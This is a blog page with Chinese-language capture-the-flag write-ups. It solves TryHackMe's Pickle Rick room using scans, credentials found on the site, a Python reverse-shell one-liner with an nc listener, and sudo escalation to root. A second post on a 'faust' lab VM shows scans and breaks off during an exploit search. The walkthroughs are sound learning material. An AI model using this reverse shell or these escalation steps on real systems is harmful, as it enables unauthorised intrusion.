<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  
  <title>hackboy</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta name="description" content="hacking">
<meta property="og:type" content="website">
<meta property="og:title" content="hackboy">
<meta property="og:url" content="http://example.com/page/2/index.html">
<meta property="og:site_name" content="hackboy">
<meta property="og:description" content="hacking">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="honkerZ">
<meta property="article:tag" content="hack">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="hackboy" type="application/atom+xml">
  
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
    
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">

  
  
<link rel="stylesheet" href="/css/style.css">

  
    
<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">

  
  
<meta name="generator" content="Hexo 6.3.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">hackboy</a>
      </h1>
      
        <h2 id="subtitle-wrap">
          <a href="/" id="subtitle">hacking...</a>
        </h2>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
        
          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
        
        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
      </div>
    </div>
  </div>
</header>

      <div class="outer">
        <section id="main">
  
    <article id="post-pickle-rick" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2023/08/02/pickle-rick/" class="article-date">
  <time class="dt-published" datetime="2023-08-02T12:21:46.000Z" itemprop="datePublished">2023-08-02</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2023/08/02/pickle-rick/">pickle-rick</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>This Rick and Morty-themed challenge requires you to exploit a web server and find three ingredients to help Rick make his potion and transform himself back into a human from a pickle.<br>这个以瑞克和莫蒂为主题的挑战需要你利用网络服务器并找到三种成分来帮助瑞克制作他的药水，并将自己从泡菜变回人类。</p>
<h2 id="1-扫面端口服务"><a href="#1-扫面端口服务" class="headerlink" title="1.扫面端口服务"></a>1.扫面端口服务</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/<span class="type">home</span>/<span class="type">ace</span>]</span><br><span class="line">└─<span class="comment"># nmap -T4 -sC -sV  10.10.77.88 </span></span><br><span class="line">Starting Nmap <span class="number">7.93</span> ( https://nmap.org ) at <span class="number">2023</span><span class="literal">-08-02</span> <span class="number">20</span>:<span class="number">35</span> CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> <span class="number">10.10</span>.<span class="number">77.88</span></span><br><span class="line">Host is up (<span class="number">0.26</span>s latency).</span><br><span class="line">Not shown: <span class="number">998</span> closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line"><span class="number">22</span>/tcp open  ssh     OpenSSH <span class="number">7.2</span>p2 Ubuntu <span class="number">4</span>ubuntu2.<span class="number">6</span> (Ubuntu Linux; protocol <span class="number">2.0</span>)</span><br><span class="line">| ssh<span class="literal">-hostkey</span>: </span><br><span class="line">|   <span class="number">2048</span> <span class="number">1</span>fe0d95dd18260868b59be032663c81e (RSA)</span><br><span class="line">|   <span class="number">256</span> e35968585967939fe85d95b2d4d687d1 (ECDSA)</span><br><span class="line">|_  <span class="number">256</span> <span class="number">616</span>fd51e2aa6ee0675204c9a8b5e2111 (ED25519)</span><br><span class="line"><span class="number">80</span>/tcp open  http    Apache httpd <span class="number">2.4</span>.<span class="number">18</span> ((Ubuntu))</span><br><span class="line">|_http<span class="literal">-title</span>: Rick is sup4<span class="built_in">r</span> cool</span><br><span class="line">|_http<span class="literal">-server-header</span>: Apache/<span class="number">2.4</span>.<span class="number">18</span> (Ubuntu)</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned <span class="keyword">in</span> <span class="number">45.74</span> seconds</span><br></pre></td></tr></table></figure>

<p>80端口开放，可以尝试访问web</p>
<h2 id="2-页面追踪"><a href="#2-页面追踪" class="headerlink" title="2.页面追踪"></a>2.页面追踪</h2><p><img src="/../pic/image-20230802204127203.png" alt="image-20230802204127203"></p>
<p>查看源码：</p>
<p><img src="/../pic/image-20230802204202036.png" alt="image-20230802204202036"></p>
<p>哦买噶，账号：R1ckRul3s</p>
<p>扫目录，看看能不能利用：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/<span class="type">home</span>/<span class="type">ace</span>]</span><br><span class="line">└─<span class="comment"># dirsearch  -u http://10.10.77.88/</span></span><br><span class="line"></span><br><span class="line">  _|. _ _  _  _  _ _|_    v0.<span class="number">4.2</span>                                                                                                                                        </span><br><span class="line"> (_||| _) (/_(_|| (_| )                                                                                                                                                 </span><br><span class="line">                                                                                                                                                                        </span><br><span class="line">Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: <span class="number">30</span> | Wordlist size: <span class="number">10927</span></span><br><span class="line"></span><br><span class="line">Output File: /root/.dirsearch/reports/<span class="number">10.10</span>.<span class="number">77.88</span>/<span class="literal">-_23-08-02_20-45-25</span>.txt</span><br><span class="line"></span><br><span class="line">Error Log: /root/.dirsearch/logs/errors<span class="literal">-23-08-02_20-45-25</span>.log</span><br><span class="line"></span><br><span class="line">Target: http://<span class="number">10.10</span>.<span class="number">77.88</span>/</span><br><span class="line"></span><br><span class="line">[<span class="number">20</span>:<span class="number">45</span>:<span class="number">26</span>] Starting:                             </span><br><span class="line">[<span class="number">20</span>:<span class="number">45</span>:<span class="number">40</span>] <span class="number">403</span> -  <span class="number">291</span>B  - /.php3                                           </span><br><span class="line">[<span class="number">20</span>:<span class="number">46</span>:<span class="number">21</span>] <span class="number">200</span> -    <span class="number">2</span>KB - /assets/                                          </span><br><span class="line">[<span class="number">20</span>:<span class="number">46</span>:<span class="number">21</span>] <span class="number">301</span> -  <span class="number">311</span>B  - /assets  -&gt;  http://<span class="number">10.10</span>.<span class="number">77.88</span>/assets/           </span><br><span class="line">[<span class="number">20</span>:<span class="number">46</span>:<span class="number">52</span>] <span class="number">200</span> -    <span class="number">1</span>KB - /index.html                                       </span><br><span class="line">[<span class="number">20</span>:<span class="number">46</span>:<span class="number">59</span>] <span class="number">200</span> -  <span class="number">882</span>B  - /login.php                                        </span><br><span class="line">[<span class="number">20</span>:<span class="number">47</span>:<span class="number">20</span>] <span class="number">200</span> -   <span class="number">17</span>B  - /robots.txt                                       </span><br><span class="line">[<span class="number">20</span>:<span class="number">47</span>:<span class="number">22</span>] <span class="number">403</span> -  <span class="number">300</span>B  - /server<span class="literal">-status</span>/                                   </span><br><span class="line">[<span class="number">20</span>:<span class="number">47</span>:<span class="number">22</span>] <span class="number">403</span> -  <span class="number">299</span>B  - /server<span class="literal">-status</span></span><br><span class="line">                                                                             </span><br><span class="line">Task Completed  </span><br></pre></td></tr></table></figure>

<p>查看robots.txt</p>
<p><img src="/../pic/image-20230802205020703.png" alt="image-20230802205020703"></p>
<p>这可能是密码：Wubbalubbadubdub</p>
<p>进login试试</p>
<p>哦耶！！！</p>
<p><img src="/../pic/image-20230802205302313.png" alt="image-20230802205302313"></p>
<p><img src="/../pic/image-20230802205402871.png" alt="image-20230802205402871"></p>
<p>shit！！！这里埋伏老子！！！</p>
<p>反弹试试</p>
<p>less阅读</p>
<p><img src="/../pic/image-20230802210228010.png" alt="image-20230802210228010"></p>
<h2 id="3-反弹shell"><a href="#3-反弹shell" class="headerlink" title="3.反弹shell"></a>3.反弹shell</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export RHOST=&quot;&lt;YOUR IP&gt;&quot;;export RPORT=4444;python3 -c &#x27;import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(&quot;RHOST&quot;),int(os.getenv(&quot;RPORT&quot;))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(&quot;sh&quot;)&#x27;</span><br></pre></td></tr></table></figure>

<p>本地监听4444</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 4444</span><br></pre></td></tr></table></figure>

<p>连接成功！！！</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/<span class="type">home</span>/<span class="type">ace</span>]</span><br><span class="line">└─<span class="comment"># nc -lvnp 4444</span></span><br><span class="line">listening on [<span class="type">any</span>] <span class="number">4444</span> ...</span><br><span class="line">connect to <span class="function">[<span class="number">10.18</span><span class="type">.75.12</span>] <span class="title">from</span></span> (UNKNOWN) [<span class="number">10.10</span><span class="type">.77.88</span>] <span class="number">54194</span></span><br><span class="line"><span class="variable">$</span> <span class="built_in">ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">Sup3rS3cretPickl3Ingred.txt  clue.txt    index.html  portal.php</span><br><span class="line">assets                       denied.php  login.php   robots.txt</span><br><span class="line"><span class="variable">$</span> </span><br></pre></td></tr></table></figure>

<p>下面查看第二个成分：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">python3 <span class="literal">-c</span> <span class="string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span></span><br><span class="line">www<span class="literal">-data</span>@ip<span class="literal">-10-10-77-88</span>:/var/www/html<span class="variable">$</span> <span class="built_in">cd</span> ../../..</span><br><span class="line"><span class="built_in">cd</span> ../../..</span><br><span class="line">www<span class="literal">-data</span>@ip<span class="literal">-10-10-77-88</span>:/<span class="variable">$</span> <span class="built_in">ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">bin   etc         lib         media  proc  sbin  sys  var</span><br><span class="line">boot  home        lib64       mnt    root  snap  tmp  vmlinuz</span><br><span class="line">dev   initrd.img  lost+found  opt    run   srv   usr</span><br><span class="line">www<span class="literal">-data</span>@ip<span class="literal">-10-10-77-88</span>:/<span class="variable">$</span> <span class="built_in">cd</span> home</span><br><span class="line"><span class="built_in">cd</span> home</span><br><span class="line">www<span class="literal">-data</span>@ip<span class="literal">-10-10-77-88</span>:/home<span class="variable">$</span> <span class="built_in">ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">rick  ubuntu</span><br><span class="line">www<span class="literal">-data</span>@ip<span class="literal">-10-10-77-88</span>:/home<span class="variable">$</span> <span class="built_in">cd</span> rick</span><br><span class="line"><span class="built_in">cd</span> rick</span><br><span class="line">www<span class="literal">-data</span>@ip<span class="literal">-10-10-77-88</span>:/home/rick<span class="variable">$</span> <span class="built_in">ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">second ingredients</span><br><span class="line">www<span class="literal">-data</span>@ip<span class="literal">-10-10-77-88</span>:/home/rick<span class="variable">$</span> <span class="built_in">cat</span> second ingredients</span><br><span class="line"><span class="built_in">cat</span> second ingredients</span><br><span class="line"><span class="built_in">cat</span>: second: No such file or directory</span><br><span class="line"><span class="built_in">cat</span>: ingredients: No such file or directory</span><br><span class="line">www<span class="literal">-data</span>@ip<span class="literal">-10-10-77-88</span>:/home/rick<span class="variable">$</span> <span class="built_in">cat</span> <span class="string">&quot;second ingredients&quot;</span></span><br><span class="line"><span class="built_in">cat</span> <span class="string">&quot;second ingredients&quot;</span></span><br><span class="line"><span class="number">1</span> jerry tear</span><br><span class="line">www<span class="literal">-data</span>@ip<span class="literal">-10-10-77-88</span>:/home/rick<span class="variable">$</span> </span><br></pre></td></tr></table></figure>

<h2 id="4-sudo提权"><a href="#4-sudo提权" class="headerlink" title="4.sudo提权"></a>4.sudo提权</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">www<span class="literal">-data</span>@ip<span class="literal">-10-10-77-88</span>:/home/rick<span class="variable">$</span> sudo <span class="literal">-l</span></span><br><span class="line">sudo <span class="literal">-l</span></span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> www<span class="literal">-data</span> on</span><br><span class="line">    ip<span class="literal">-10-10-77-88</span>.eu<span class="literal">-west-1</span>.compute.internal:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User www<span class="literal">-data</span> may run the following commands on</span><br><span class="line">        ip<span class="literal">-10-10-77-88</span>.eu<span class="literal">-west-1</span>.compute.internal:</span><br><span class="line">    (ALL) NOPASSWD: ALL</span><br><span class="line">www<span class="literal">-data</span>@ip<span class="literal">-10-10-77-88</span>:/home/rick<span class="variable">$</span> sudo /bin/bash</span><br><span class="line">sudo /bin/bash</span><br><span class="line">root@ip<span class="literal">-10-10-77-88</span>:/home/rick<span class="comment"># ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">second ingredients</span><br><span class="line">root@ip<span class="literal">-10-10-77-88</span>:/home/rick<span class="comment"># cd ../..</span></span><br><span class="line"><span class="built_in">cd</span> ../..</span><br><span class="line">root@ip<span class="literal">-10-10-77-88</span>:/<span class="comment"># cd root</span></span><br><span class="line"><span class="built_in">cd</span> root</span><br><span class="line">root@ip<span class="literal">-10-10-77-88</span>:~<span class="comment"># ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line"><span class="number">3</span>rd.txt  snap</span><br><span class="line">root@ip<span class="literal">-10-10-77-88</span>:~<span class="comment"># cat 3rd.txt</span></span><br><span class="line"><span class="built_in">cat</span> <span class="number">3</span>rd.txt</span><br><span class="line"><span class="number">3</span><span class="built_in">rd</span> ingredients: fleeb juice</span><br><span class="line">root@ip<span class="literal">-10-10-77-88</span>:~<span class="comment">#       </span></span><br></pre></td></tr></table></figure>

<p>over!!!</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2023/08/02/pickle-rick/" data-id="clmnr8k0p002iso8g0q2uhibs" data-title="pickle-rick" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/tryhackme/" rel="tag">tryhackme</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-faust" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2023/07/30/faust/" class="article-date">
  <time class="dt-published" datetime="2023-07-30T08:29:12.000Z" itemprop="datePublished">2023-07-30</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/">渗透学习</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2023/07/30/faust/">faust</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>攻击机：kali  192.168.56.127 nat+桥接</p>
<p>靶机： 192.168.56.138  桥接</p>
<h2 id="1-扫描网段"><a href="#1-扫描网段" class="headerlink" title="1.扫描网段"></a>1.扫描网段</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/<span class="type">home</span>/<span class="type">ace</span>]</span><br><span class="line">└─<span class="comment"># nmap -sP 192.168.56.0/24                  </span></span><br><span class="line">Starting Nmap <span class="number">7.93</span> ( https://nmap.org ) at <span class="number">2023</span><span class="literal">-07-30</span> <span class="number">16</span>:<span class="number">22</span> CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> <span class="number">192.168</span>.<span class="number">56.1</span></span><br><span class="line">Host is up (<span class="number">0.00069</span>s latency).</span><br><span class="line">MAC Address: <span class="number">0</span>A:<span class="number">00</span>:<span class="number">27</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">0</span>A (Unknown)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> <span class="number">192.168</span>.<span class="number">56.100</span></span><br><span class="line">Host is up (<span class="number">0.00056</span>s latency).</span><br><span class="line">MAC Address: <span class="number">08</span>:<span class="number">00</span>:<span class="number">27</span>:E6:CC:<span class="number">38</span> (Oracle VirtualBox virtual NIC)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> <span class="number">192.168</span>.<span class="number">56.138</span></span><br><span class="line">Host is up (<span class="number">0.0021</span>s latency).</span><br><span class="line">MAC Address: <span class="number">08</span>:<span class="number">00</span>:<span class="number">27</span>:<span class="number">2</span>D:C8:<span class="number">1</span>C (Oracle VirtualBox virtual NIC)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> <span class="number">192.168</span>.<span class="number">56.127</span></span><br><span class="line">Host is up.</span><br><span class="line">Nmap done: <span class="number">256</span> IP addresses (<span class="number">4</span> hosts up) scanned <span class="keyword">in</span> <span class="number">7.53</span> seconds</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="2-扫描相关端口服务"><a href="#2-扫描相关端口服务" class="headerlink" title="2.扫描相关端口服务"></a>2.扫描相关端口服务</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/<span class="type">home</span>/<span class="type">ace</span>]</span><br><span class="line">└─<span class="comment"># nmap -sC -sV -p-  192.168.56.138 </span></span><br><span class="line">Starting Nmap <span class="number">7.93</span> ( https://nmap.org ) at <span class="number">2023</span><span class="literal">-07-30</span> <span class="number">16</span>:<span class="number">23</span> CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> <span class="number">192.168</span>.<span class="number">56.138</span></span><br><span class="line">Host is up (<span class="number">0.0027</span>s latency).</span><br><span class="line">Not shown: <span class="number">65532</span> closed tcp ports (reset)</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line"><span class="number">22</span>/tcp   open  ssh     OpenSSH <span class="number">7.9</span>p1 Debian <span class="number">10</span>+deb10u2 (protocol <span class="number">2.0</span>)</span><br><span class="line">| ssh<span class="literal">-hostkey</span>: </span><br><span class="line">|   <span class="number">2048</span> <span class="number">540</span>a75c52656f5b05f6de1e07715c70d (RSA)</span><br><span class="line">|   <span class="number">256</span> <span class="number">0</span>bd789522d1316cb7496f55fdd3e528e (ECDSA)</span><br><span class="line">|_  <span class="number">256</span> <span class="number">5</span>a900cf52b7fba1c83024de7a2a21d5b (ED25519)</span><br><span class="line"><span class="number">80</span>/tcp   open  http    Apache httpd <span class="number">2.4</span>.<span class="number">38</span> ((Debian))</span><br><span class="line">|_http<span class="literal">-server-header</span>: Apache/<span class="number">2.4</span>.<span class="number">38</span> (Debian)</span><br><span class="line">|_http<span class="literal">-generator</span>: CMS Made Simple - Copyright (C) <span class="number">2004</span><span class="literal">-2021</span>. All rights reserved.</span><br><span class="line">|_http<span class="literal">-title</span>: Home - cool_cms</span><br><span class="line"><span class="number">6660</span>/tcp open  unknown</span><br><span class="line">| fingerprint<span class="literal">-strings</span>: </span><br><span class="line">|   NULL, Socks5: </span><br><span class="line">|     MESSAGE <span class="keyword">FOR</span> WWW<span class="literal">-DATA</span>:</span><br><span class="line">|     [<span class="number">31</span><span class="type">m</span> <span class="type">www</span>-<span class="type">data</span> <span class="type">I</span> <span class="type">offer</span> <span class="type">you</span> <span class="type">a</span> <span class="type">dilemma</span>: <span class="type">if</span> <span class="type">you</span> <span class="type">agree</span> <span class="type">to</span> <span class="type">destroy</span> <span class="type">all</span> <span class="type">your</span> <span class="type">stupid</span> <span class="type">work</span>, <span class="type">then</span> <span class="type">you</span> <span class="type">have</span> <span class="type">a</span> <span class="type">reward</span> <span class="type">in</span> <span class="type">my</span> <span class="type">house...</span></span><br><span class="line">|<span class="type">_</span>    <span class="type">Paul</span></span><br><span class="line"><span class="number">1</span> <span class="type">service</span> <span class="type">unrecognized</span> <span class="type">despite</span> <span class="type">returning</span> <span class="type">data.</span> <span class="type">If</span> <span class="type">you</span> <span class="type">know</span> <span class="type">the</span> <span class="type">service</span>/<span class="type">version</span>, <span class="type">please</span> <span class="type">submit</span> <span class="type">the</span> <span class="type">following</span> <span class="type">fingerprint</span> <span class="type">at</span> <span class="type">https</span>://<span class="type">nmap.org</span>/<span class="type">cgi</span>-<span class="type">bin</span>/<span class="type">submit.cgi</span>?<span class="built_in">new-service</span> :</span><br><span class="line"><span class="type">SF</span>-<span class="type">Port6660</span>-<span class="type">TCP</span>:<span class="type">V</span>=<span class="number">7.93</span>%<span class="type">I</span>=<span class="number">7</span>%<span class="type">D</span>=<span class="number">7</span>/<span class="number">30</span>%<span class="type">Time</span>=<span class="number">64</span><span class="type">C61DFE</span>%<span class="type">P</span>=<span class="type">x86_64</span>-<span class="type">pc</span>-<span class="type">linux</span>-<span class="type">gnu</span>%<span class="type">r</span>(<span class="type">NU</span></span><br><span class="line"><span class="type">SF</span>:<span class="type">LL</span>,<span class="type">A5</span>,<span class="string">&quot;\n\n\x20\x20\x20MESSAGE\x20FOR\x20WWW-DATA:\n\n\x20\x1b\[31m\x20</span></span><br><span class="line"><span class="string">SF:\x20www-data\x20I\x20offer\x20you\x20a\x20dilemma:\x20if\x20you\x20agre</span></span><br><span class="line"><span class="string">SF:e\x20to\x20destroy\x20all\x20your\x20stupid\x20work,\x20then\x20you\x20</span></span><br><span class="line"><span class="string">SF:have\x20a\x20reward\x20in\x20my\x20house\.\.\.\n\x20\x20\x20Paul\x20\x1</span></span><br><span class="line"><span class="string">SF:b\[0m\n&quot;</span>)%<span class="type">r</span>(<span class="type">Socks5</span>,<span class="type">A5</span>,<span class="string">&quot;\n\n\x20\x20\x20MESSAGE\x20FOR\x20WWW-DATA:\n\n\</span></span><br><span class="line"><span class="string">SF:x20\x1b\[31m\x20\x20www-data\x20I\x20offer\x20you\x20a\x20dilemma:\x20i</span></span><br><span class="line"><span class="string">SF:f\x20you\x20agree\x20to\x20destroy\x20all\x20your\x20stupid\x20work,\x2</span></span><br><span class="line"><span class="string">SF:0then\x20you\x20have\x20a\x20reward\x20in\x20my\x20house\.\.\.\n\x20\x2</span></span><br><span class="line"><span class="string">SF:0\x20Paul\x20\x1b\[0m\n&quot;</span>);</span><br><span class="line"><span class="type">MAC</span> <span class="type">Address</span>: <span class="number">08</span>:<span class="number">00</span>:<span class="number">27</span>:<span class="number">2</span><span class="type">D</span>:<span class="type">C8</span>:<span class="number">1</span><span class="type">C</span> (<span class="type">Oracle</span> <span class="type">VirtualBox</span> <span class="type">virtual</span> <span class="type">NIC</span>)</span><br><span class="line"><span class="type">Service</span> <span class="type">Info</span>: <span class="type">OS</span>: <span class="type">Linux</span>; <span class="type">CPE</span>: <span class="type">cpe</span>:/<span class="type">o</span>:<span class="type">linux</span>:<span class="type">linux_kernel</span></span><br><span class="line"></span><br><span class="line"><span class="type">Service</span> <span class="type">detection</span> <span class="type">performed.</span> <span class="type">Please</span> <span class="type">report</span> <span class="type">any</span> <span class="type">incorrect</span> <span class="type">results</span> <span class="type">at</span> <span class="type">https</span>://<span class="type">nmap.org</span>/<span class="type">submit</span>/ <span class="type">.</span></span><br><span class="line"><span class="type">Nmap</span> <span class="type">done</span>: <span class="number">1</span> <span class="type">IP</span> <span class="type">address</span> (<span class="number">1</span> <span class="type">host</span> <span class="type">up</span>) <span class="type">scanned</span> <span class="type">in</span> <span class="number">20.33</span> <span class="type">seconds</span></span><br></pre></td></tr></table></figure>

<h2 id="3-查看网页"><a href="#3-查看网页" class="headerlink" title="3.查看网页"></a>3.查看网页</h2><p><img src="/../pic/image-20230730163252472.png" alt="image-20230730163252472"></p>
<p>哦哦，这种架构看看是否漏洞</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/<span class="type">home</span>/<span class="type">ace</span>]</span><br><span class="line">└─<span class="comment"># searchsploit CMS Made Simple                                       </span></span><br><span class="line"><span class="literal">--------------------------------------------------------------------------------------------------------------------------------------</span> <span class="literal">---------------------------------</span></span><br><span class="line"> Exploit Title                                                                                                                        |  Path</span><br><span class="line"><span class="literal">--------------------------------------------------------------------------------------------------------------------------------------</span> <span class="literal">---------------------------------</span></span><br><span class="line">CMS Made Simple (CMSMS) Showtime2 - File 